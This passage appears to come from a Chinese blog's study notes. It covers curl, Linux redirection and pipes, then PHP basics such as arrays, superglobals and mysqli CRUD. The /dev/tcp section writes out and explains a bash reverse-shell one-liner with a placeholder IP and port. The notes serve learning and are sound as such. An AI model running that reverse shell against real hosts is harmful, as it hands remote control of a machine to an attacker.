Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                  Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"> 100  2381  100  2381    0     0  20350      0 --:--:-- --:--:-- --:--:-- 20350&lt;!DOCTYPE html&gt;</span><br><span class="line"> &lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;&lt;meta http-equiv=X-UA-Compatible content=IE=Edge&gt;&lt;meta content=always name=referrer&gt;</span><br><span class="line">    ......</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">  &lt;/html&gt;</span><br><span class="line"> #curl 默认是不进行重定向的。如果要进行重定向，我们需要加上-L参数</span><br><span class="line"> curl -L taobao.com</span><br><span class="line"> #加上 -o 参数可以保存网页源代码到本地</span><br><span class="line"> curl -o taobao.txt taobao.com -L</span><br><span class="line"> #加上-i参数可以看到响应报文</span><br><span class="line"> curl -i baidu.com</span><br><span class="line"> $ curl -i baidu.com</span><br><span class="line">   % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                  Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"> 100    81  100    81    0     0    627      0 --:--:-- --:--:-- --:--:--   627HTTP/1.1 200 OK</span><br><span class="line"> Server:</span><br><span class="line"> Date: Wed, 25 Mar 2020 16:00:02 GMT</span><br><span class="line"> Content-Type: text/html</span><br><span class="line"> Content-Length: 81</span><br><span class="line"> Connection: keep-alive</span><br><span class="line"> Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT</span><br><span class="line"> ETag: &quot;51-47cf7e6ee8400&quot;</span><br><span class="line"> Accept-Ranges: bytes</span><br><span class="line"> ​</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.baidu.com/&quot;&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="linux中重定向"><a href="#linux中重定向" class="headerlink" title="linux中重定向"></a>linux中重定向</h3><p>重定向指用户用文件代替标准输入，标准输出，标准错误输出</p><p>注：Linux 中标准的输入设备默认指的是键盘，标准的输出设备默认指的是显示器。</p><p>方式</p><p>代码</p><p>运算符</p><p>标准输入（stdin)</p><p>0</p><p>&lt; or &lt;&lt;</p><p>标准输出（stdout）</p><p>1</p><p>&gt; or &gt;&gt;</p><p>标准错误输出（stderr）</p><p>2</p><p>2&gt; or 2&lt;</p><h5 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> #&#123; 默认情况下，cat 命令会接受标准输入设备（键盘）的输入，并显示到控制台，但如果用文件代替键盘作为输入设备，那么该命令会以指定的文件作为输入设备，并将文件中的内容读取并显示到控制台。 &#125;</span><br><span class="line"> e.g:</span><br><span class="line"> 1.cat index.php &gt; index2.php   </span><br><span class="line"> #将index.php的内容放到index2.php（自动创建）中</span><br><span class="line"> ​</span><br><span class="line"> 2.cat &gt; index.php</span><br><span class="line"> ... </span><br><span class="line"> #直接将该内容替换index.php中原有内容</span><br><span class="line"> ​</span><br><span class="line"> 3.cat &gt;&gt; index.php</span><br><span class="line"> ...</span><br><span class="line"> #将该内容加在原内容后面</span><br><span class="line"> ​</span><br><span class="line"> 4.cat &gt; test2.txt &lt; test.txt</span><br><span class="line"> #把test.txt内容加到test2.txt中并输出</span><br></pre></td></tr></table></figure><h5 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h5><p>相较于输入重定向，我们使用输出重定向的频率更高。并且，和输入重定向不同的是，输出重定向还可以细分为<strong>标准输出重定向</strong>和<strong>错误输出重定向</strong>两种技术。</p><p>在此基础上，标准输出重定向和错误输出重定向又分别包含<strong>清空写入</strong>和<strong>追加写入</strong>两种模式。因此，对于输出重定向来说，其需要用到的符号以及作用如图。</p><p>命令符号格式</p><p>作用</p><p>命令 &gt; 文件</p><p>将命令执行的<strong>标准输出结果</strong>重定向输出到指定的文件中，如果该文件已包含数据，会清空原有数据，再写入新数据。</p><p>命令 2&gt; 文件</p><p>将命令执行的<strong>错误输出结果</strong>重定向到指定的文件中，如果该文件中已包含数据，会清空原有数据，再写入新数据。</p><p>命令 &gt;&gt; 文件</p><p>将命令执行的标准输出结果重定向输出到指定的文件中，如果该文件已包含数据，新数据将写入到原有内容的后面。</p><p>命令 2&gt;&gt; 文件</p><p>将命令执行的错误输出结果重定向到指定的文件中，如果该文件中已包含数据，新数据将写入到原有内容的后面。</p><p>命令 &gt;&gt; 文件 2&gt;&amp;1 或者 命令 &amp;&gt;&gt; 文件</p><p>将<strong>标准输出或者错误输出</strong>写入到指定文件，如果该文件中已包含数据，新数据将写入到原有内容的后面。注意，第一种格式中，<strong>最后的 2&gt;&amp;1 是一体的，可以认为是固定写法。</strong></p><p>linux重定向中<code>&amp;&gt;</code>和<code>&gt;&amp;</code>是一个意思，是“复制一个文件描述符”的意思。</p><h5 id="特殊文件：-dev-tcp-dd"><a href="#特殊文件：-dev-tcp-dd" class="headerlink" title="特殊文件： &#x2F;dev&#x2F;tcp(dd)"></a>特殊文件： &#x2F;dev&#x2F;tcp(dd)</h5><p>&#x2F;dev&#x2F;tcp不是磁盘里的文件，而是bash的一个功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 反弹shell命令：bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br><span class="line"> url：https://blog.csdn.net/Auuuuuuuu/article/details/89059176</span><br><span class="line"> 就是说，攻击机的标准输入重定向到靶机的标准输出。</span><br><span class="line"> bash -i &lt; /dev/tcp/ip/port</span><br><span class="line"> 再把靶机的这个标准输出作为输入，命令执行后把结果作为标准输入重定向到攻击机中作为标准输出</span><br><span class="line">  bash i &gt; /dec/tcp/192.168.25.144/8888</span><br><span class="line">  两者结合得到</span><br><span class="line">  bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>linux中的一个特殊文件： &#x2F;dev&#x2F;tcp ,打开这个文件就类似于发出了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</p><p>&#x2F;dev&#x2F;[tcpupd]&#x2F;host&#x2F;port 只要读取或者写入这个文件，相当于系统会尝试连接:host 这台机器，对应port端口。如果主机以及端口存在，就建立一个socket 连接。将在，&#x2F;proc&#x2F;self&#x2F;fd目录下面，有对应的文件出现。</p><h3 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h3><h5 id="命令连接符"><a href="#命令连接符" class="headerlink" title="命令连接符"></a>命令连接符</h5><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221031020410633-1024x370.png" style="zoom:67%;" /><p><strong>注意这里连接符的 跟管道符 不一样</strong></p><h5 id="管道符-详解"><a href="#管道符-详解" class="headerlink" title="管道符 详解"></a>管道符 详解</h5><p><strong>管道符也是一种重定向操作符。</strong></p><h6 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h6><p>管道符主要用于多重命令处理，前面命令的打印结果作为后面命令的输入。简单点说就是，就像工厂的流水线一样，进行完一道工序后，继续传送给下一道工序处理…</p><h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><p>使用管道操作符“”可以<strong>把一个命令的标准输出传送到另一个命令的标准输入中</strong>，连续的意味着第一个命令的输出为第二个命令的输入，第二个命令的输入为第一个命令的输出，依次类推。</p><p>最常用的就是配合grep来使用：</p><p>ps -ef grep pycharm</p><p>ps是进程查看命令，其中-e为显示所有进程，-f为全格式显示。</p><p>grep是一个非常高效的查询工具，可以查询文本中带有某关键字的行。</p><p>这个命令的功能是，查询带有关键字 pycharm 的进程。会一条一条列出。</p><p>但不是所有的命令都能搭配管道符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 例如cat、sort、uniq、grep等命令均支持管道符，是因为这些命令均可从标准输入中读取要处理的文本（即从标准输入中读取参数）；而对于部分命令，例如rm、kill等命令则不支持从标准输入中读取参数，只支持从命令行中读取参数（即rm命令后面必须指定删除的文件或者目录，kill命令后面必须要指定杀死的进程号等）</span><br><span class="line"> 那什么样的命令支持管道，什么样的命令不支持管道呢？</span><br><span class="line"> 一般情况下，处理文本的命令，例如sort、uniq、grep、awk、sed等命令均支持管道；像rm、ls这类的不是处理文本的命令均不支持管道</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> web基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP</title>
      <link href="/2023/05/14/php/"/>
      <url>/2023/05/14/php/</url>
      
        <content type="html"><![CDATA[<p><strong>PHP</strong>（PHP: Hypertext Preprocessor）即<strong>超文本预处理器</strong>，是在<strong>服务器端</strong>执行的<strong>脚本语言</strong>，尤其适用于Web开发并可嵌入HTML中。PHP语法学习了C语言，吸纳Java和Perl多个语言的特色发展出自己的特色语法，并根据它们的长项持续改进提升自己，例如java的面对对象的编程，该语言当初创建的主要目标是让开发人员快速编写出优质的web网站。PHP同时支持面向对象和面向过程的开发，使用上<strong>非常灵活</strong>。 PHP是世界上最好的语言捏</p><p>静态网页和动态网页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> 静态网页</span><br><span class="line"> 纯粹html格式的网页被称为静态网页。静态网页指没有后台数据库，不含程序和不可交互的网页</span><br><span class="line"> 动态网页</span><br><span class="line"> 动态页面是基本的html语法规范与PHP，java，python等程序语言，数据库等多种技术的融合。显示内容可以随时间环境或数据库操作的结果而发生改变</span><br></pre></td></tr></table></figure><p>PHP的一个万金油架构：</p><p>linux+Apache+mysql+PHP （lamp） -&gt;免费</p><h3 id="PHP标记"><a href="#PHP标记" class="headerlink" title="PHP标记"></a>PHP标记</h3><h6 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> php代码1;</span><br><span class="line"> php代码2;</span><br><span class="line"> ·</span><br><span class="line"> ·</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><p>注：如果文件中<strong>只有</strong>PHP语言，则可以不用”?&gt;”<strong>结束标记</strong>，否则必须要加的。</p><h6 id="拓展名"><a href="#拓展名" class="headerlink" title="拓展名"></a>拓展名</h6><p>PHP 文件的<strong>默认</strong>文件扩展名是 “.php”。</p><p>当然也有<strong>其他</strong>拓展名：</p><p>php2，php3、php4、php5</p><p>这些后缀名也是可以被php解释器解析的</p><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><ul><li>String（字符串）（用<strong>单引号</strong>或者<strong>双引号</strong>包起来）</li><li>Integer（整型） （整型可以用三种格式来指定：<strong>十进制</strong>， <strong>十六进制</strong>（ 以 0x 为前缀）或<strong>八进制</strong>（前缀为 0））</li><li>Float（浮点型）</li><li>Boolean（布尔型）</li><li>Array（数组） （打印：使用 PHP var_dump() 函数或者<pre>标签中返回数组的数据类型和值）</li><li>Object（对象） （对象必须声明）</li><li>NULL（空值）</li><li>Resource（资源类型） （常见资源数据类型有打开文件、数据库连接、图形画布区域等） （dd）</li></ul><h6 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h6><p>字符串运算</p><p>javascript中用'+'来连接字符串</p><p>而PHP中用 '.' 来连接字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> //赋值运算：  .=</span><br><span class="line"> $a .= 2  </span><br><span class="line"> //即：</span><br><span class="line"> $a = $a . &#x27;2&#x27;</span><br></pre></td></tr></table></figure><h6 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h6><p>分类：</p><p><strong>索引数组</strong>（索引数组和js一样)</p><p><em>a</em>.初始静态化</p><p><strong>pre</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> $arr=[1,2,3,4,5,6];</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($arr);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015161758209.png"></p><p><strong>var_dump</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> $arr=[1,2,3,4,5,6];</span><br><span class="line"> var_dump($arr);</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015161945306-1024x57.png"></p><p>array关键字的方式,下标的方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> $arr = array(1,2,3,4,5,6);</span><br><span class="line"> $arr[0]=&quot;youzhi&quot;;</span><br><span class="line"> $arr[1]=&quot;p5ych&quot;;</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($arr);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015162700322.png"></p><p><strong>关联数组</strong>（用的做多）</p><p>在数组中呈现的是键值对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> key =&gt; value</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> $arr = array(&quot;name&quot;=&gt;&quot;p5ych&quot;,&quot;age&quot;=&gt;18,&quot;gender&quot;=&gt;2);</span><br><span class="line"> echo&quot;&lt;pre&gt;&quot;;</span><br><span class="line"> print_r($arr);</span><br><span class="line"> echo&quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015163008661.png"></p><p><strong>遍历数组的一个循环</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> foreach($arr as $key=&gt;$value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $arr = array(1,2,3,4,5,10);</span><br><span class="line"> foreach($arr as $key=&gt;$value)&#123;</span><br><span class="line">    echo $key. &quot;=&gt;&quot; .$value.&quot;&lt;/br&gt;&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> ​</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015163344284.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> foreach($arr as $value)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> $arr = array(1,2,3,4,5,10);</span><br><span class="line"> foreach($arr as $key=&gt;$value)&#123;</span><br><span class="line">    $sum += $value;</span><br><span class="line"> &#125;</span><br><span class="line"> echo $sum;       //25</span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>PHP变量使用之前<strong>不需要</strong>提前声明</p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> $x=5;         //没有声明，在第一次赋值给它的时候被创建</span><br><span class="line"> $y=6;</span><br><span class="line"> $z=$x+$y;</span><br><span class="line"> echo $z;</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure><h4 id="赋值"><a href="#赋值" class="headerlink" title="赋值"></a>赋值</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> //拷贝赋值</span><br><span class="line"> $a = 100;</span><br><span class="line"> $b = $a;</span><br><span class="line"> $a = 200;      //$a的值从100变到200，但$b的值一直是100；</span><br><span class="line"> //引用赋值</span><br><span class="line"> $a = 100;</span><br><span class="line"> $b = &amp;$a;</span><br><span class="line"> $a = 200;    //$a的值从100变到200,%b的值也从100变到200；一旦引用赋值，二者的值就被绑定在了一起</span><br><span class="line"> 注：引用赋值是赋值的地址</span><br></pre></td></tr></table></figure><h4 id="预定义变量"><a href="#预定义变量" class="headerlink" title="预定义变量"></a>预定义变量</h4><p>又叫超全局变量，是系统<strong>已经定义</strong>的变量，可以直接调用</p><p>常见的有：</p><ul><li><strong>$GLOBALS</strong>:$GLOBALS 是一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</li><li><strong>$_SERVER</strong>$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组</li></ul><p> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">echo $_SERVER[&#x27;PHP_SELF&#x27;];               //   /a02.com/05/demo01.php》当前执行脚本的文件名                            </span><br><span class="line">echo $_SERVER[&#x27;SERVER_NAME&#x27;];            //   127.0.0.1 》当前运行脚本所在的服务器的主机名             </span><br><span class="line">echo $_SERVER[&#x27;HTTP_HOST&#x27;];              //   127.0.0.1 》 当前请求头中 Host: 项的内容</span><br><span class="line">echo $_SERVER[&#x27;HTTP_REFERER&#x27;];           //   http://127.0.0.1/a02.com/05/ 》引导用户代理到当前页的</span><br><span class="line">echo $_SERVER[&#x27;HTTP_USER_AGENT&#x27;];        //   Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0)Gecko/20100101 Firefox/105.0  》 user_agent</span><br><span class="line">echo $_SERVER[&#x27;SCRIPT_NAME&#x27;];            //   /a02.com/05/demo01.php 》 包含当前脚本的路径。</span><br></pre></td></tr></table></figure><ul><li><strong>$_REQUEST</strong>：用于收集HTML<strong>表单</strong>提交的数据。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">   $cmd = $_REQUEST[&#x27;cmd&#x27;];</span><br><span class="line">   //表单提交（post/get）一个‘cmd’数据，并把这个数据存放进cmd变量中</span><br><span class="line">   //至于是post还是get取决于表单上传数据的method标签的值</span><br><span class="line">   例如如下表单:</span><br><span class="line">   &lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;</span><br><span class="line">   Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">   &lt;/form&gt;</span><br><span class="line">   接收数据:</span><br><span class="line">   &lt;?php </span><br><span class="line">   $name = $_REQUEST[&#x27;fname&#x27;]; </span><br><span class="line">   echo $name; </span><br><span class="line">   ?&gt;  </span><br></pre></td></tr></table></figure><ul><li><strong>$_POST</strong>：$_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性："method="post"。</li><li><strong>$_GET</strong>：$_GET 被广泛应用于收集表单数据，在HTML form标签的指定该属性："method="get"。$_GET 也可以收集URL中发送的数据。</li><li><strong>$_FILES</strong>：$_FILES被广泛用于收集表单数据，接收post上传的<strong>文件数据</strong> 关于表单：<br>     表单中的name属性对应后端数组的key属性<br> 例如表单中有：<br>     name="fname"<br> 则接收数据要用：<br>     $name = $_REQUEST['fname'];</li><li><strong>$_COOKIE</strong>：$_COOKIE用于取回 cookie 的值。</li><li><strong>$_SESSION：session</strong>：PHP session 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。<strong>存储和取回</strong> session 变量的正确方法是使用 PHP $_SESSION 变量</li></ul><h3 id="PHP和html的嵌套"><a href="#PHP和html的嵌套" class="headerlink" title="PHP和html的嵌套"></a>PHP和html的嵌套</h3><h5 id="PHP输出html"><a href="#PHP输出html" class="headerlink" title="PHP输出html"></a>PHP输出html</h5><p>就用echo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> echo&quot;&lt;div&gt;&quot;;</span><br><span class="line"> echo&quot;hhh&lt;/div&gt;&quot;;</span><br></pre></td></tr></table></figure><h5 id="PHP嵌套html"><a href="#PHP嵌套html" class="headerlink" title="PHP嵌套html"></a>PHP嵌套html</h5><p>在php中输入html格式（基本骨架）</p><p>然后任何php代码都使用<?php ?>包含</p><p><strong>注意这段代码是在php文件中写入，不能是html文件，否则PHP无法被解析。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> $arr = array(&quot;百度&quot; =&gt; &quot;http://www.baidu.com&quot;,&quot;京东&quot; =&gt; &quot;http://www.jd.com&quot;);</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;html lang=&quot;en&quot;&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">     &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">     &lt;title&gt;html嵌套PHP&lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line"> &lt;ul&gt;</span><br><span class="line">     &lt;?php foreach($arr as $key =&gt; $value) &#123; ?&gt;</span><br><span class="line">         &lt;li&gt;</span><br><span class="line">             &lt;a href=&quot;&lt;?php echo $value; ?&gt;&quot;&gt;&lt;?php echo $key; ?&gt;&lt;/a&gt;</span><br><span class="line">         &lt;/li&gt;</span><br><span class="line">     &lt;?php &#125; ?&gt;</span><br><span class="line"> &lt;/ul&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>前端代码：</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015171226609.png" style="zoom: 67%;" /><h5 id="heredoc嵌入"><a href="#heredoc嵌入" class="headerlink" title="heredoc嵌入"></a>heredoc嵌入</h5><p>适用于html代码较多的情况</p><p>在PHP代码中直接插入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> echo &lt;&lt;&lt; EOT           </span><br><span class="line">     &lt;div&gt;</span><br><span class="line">     &lt;h1&gt;哈哈哈&lt;/h1&gt;</span><br><span class="line">     &lt;/div&gt;</span><br><span class="line">     EOT;</span><br><span class="line"> //EOT和EOF都可以</span><br></pre></td></tr></table></figure><h3 id="PHP和MYSQL的合作方式"><a href="#PHP和MYSQL的合作方式" class="headerlink" title="PHP和MYSQL的合作方式"></a>PHP和MYSQL的合作方式</h3><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015114345628-1024x258.png"></p><p>利用<strong>PHP去操作数据库</strong>实现增删改查（CURD）。</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>建立与数据库的连接 --> 选择要使用的数据库 --> 创建sql语句 --> 执行sql语句 --> 获取sql语句执行结果 --> 处理数据结果集 --> 关闭与数据库连接</p><h4 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h4><p>PHP与MySQL的连接有三种API接口，分别是：<strong>PHP的MySQL扩展</strong> 、<strong>PHP的mysqli扩展</strong> 、<strong>PHP数据对象(PDO)</strong></p><p>pod更多的是面向对象，mysql拓展太古老了，也不建议使用</p><p>一般建议首选mysqli拓展。</p><p>1.首先在phpinfo()中查看<strong>拓展</strong>是否打开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> phpinfo()  =&gt;  服务端的探针</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015115707083.png"></p><p>出现mysqli且有enable</p><p>2.根据前端表单创建数据库</p><p>3.<strong>建立连接</strong></p><p>mysqli_connect =>连接数据库的函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> function mysqli_connect($host = &#x27;&#x27;,$user = &#x27;&#x27;, $password = &#x27;&#x27;,$database = &#x27;&#x27;,$port = &#x27;&#x27;,$socket = &#x27;&#x27;)&#123;&#125;</span><br><span class="line"> //$host:数据库的地址</span><br><span class="line"> //$user：数据库用户名</span><br><span class="line"> //$password：数据库密码</span><br><span class="line"> //$database：要连接的数据库</span><br><span class="line"> //$port：端口</span><br></pre></td></tr></table></figure><p><strong>连接</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> $link = @mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;a02&quot;,&quot;3306&quot;)</span><br><span class="line"> if($link)&#123;</span><br><span class="line">     echo&quot;连接成功！&quot;</span><br><span class="line">     mysqli_set_charet($link,&quot;utf-8&quot;)//设置编码，确保存放中文不乱吗</span><br><span class="line"> &#125;</span><br><span class="line"> else&#123;</span><br><span class="line">     echo&quot;连接失败！&quot;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>phpstorm连接数据库</strong>：</p><p>选择mysql</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6.6.png" style="zoom:50%;" /><p>输入数据连接</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6.3-1024x801.png" style="zoom:67%;" /><p>修改时区</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6.4.png" style="zoom:67%;" /><p>连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/6.5.png"></p><h4 id="CURD"><a href="#CURD" class="headerlink" title="CURD"></a>CURD</h4><h5 id="增"><a href="#增" class="headerlink" title="增"></a>增</h5><p><strong>创建sql语句</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20221015142343537-1024x368.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> $sql = &quot;insert into users (user_name,user_pwd,user_gender) values(&#x27;jack&#x27;,&#x27;123123&#x27;,&#x27;1&#x27;)&quot;;</span><br><span class="line"> // insert into 表名 （字段名1,字段名2··） 